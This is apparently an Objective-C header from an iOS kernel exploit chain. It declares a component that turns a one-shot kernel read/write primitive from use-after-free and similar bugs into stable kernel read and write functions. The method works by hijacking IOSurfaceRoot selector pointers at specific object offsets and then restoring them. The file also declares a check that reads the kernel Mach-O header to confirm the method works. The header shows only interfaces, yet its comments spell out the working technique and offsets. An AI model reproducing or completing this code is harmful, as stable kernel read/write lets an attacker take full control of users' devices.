//
//  Lum1naSurfaceKRW.h — the IOSurfaceRoot KRW consumer (DarkSword lane).
//
//  Takes any one-shot kernel read/write and converts it into stable
//  kread32/kwrite64 through IOSurfaceRoot's selector machinery.
//  REQUIRES a source primitive (LightSword socket, p101 UAF, p168 UAF,
//  IOGPU stale entry) to initialize.
//
#import <Foundation/Foundation.h>
#import <stdint.h>

NS_ASSUME_NONNULL_BEGIN

/* Source-primitive function shapes */
typedef kern_return_t (*lsw_early_kread64_t)(uint64_t kaddr, uint64_t *out);
typedef kern_return_t (*lsw_early_kwrite64_t)(uint64_t kaddr, uint64_t val);

/* Initialize the consumer — requires the source's one-shot KRW.
   Returns 0 on success (surfaceKobj found). */
int Lum1naSurfaceKRW_Init(lsw_early_kread64_t srcKread64,
                          lsw_early_kwrite64_t srcKwrite64);

/* Stable kernel read: redirect surfaceKobj+0xc0 → sel 16 → read → restore */
uint32_t Lum1naSurfaceKRW_kread32(uint64_t kaddr);

/* Stable kernel write: redirect surfaceKobj+0x360 → sel 31 → write → restore */
void Lum1naSurfaceKRW_kwrite64(uint64_t kaddr, uint64_t val);

/* The gate: kread32(kbase) == MH_MAGIC_64 → nonzero = PASS */
uint64_t Lum1naSurfaceKRW_GateCheck(uint64_t kbase);

int Lum1naSurfaceKRW_IsReady(void);
uint64_t Lum1naSurfaceKRW_SurfaceKobj(void);
uint32_t Lum1naSurfaceKRW_SurfaceId(void);
uint64_t Lum1naSurfaceKRW_RootConn(void);

NS_ASSUME_NONNULL_END
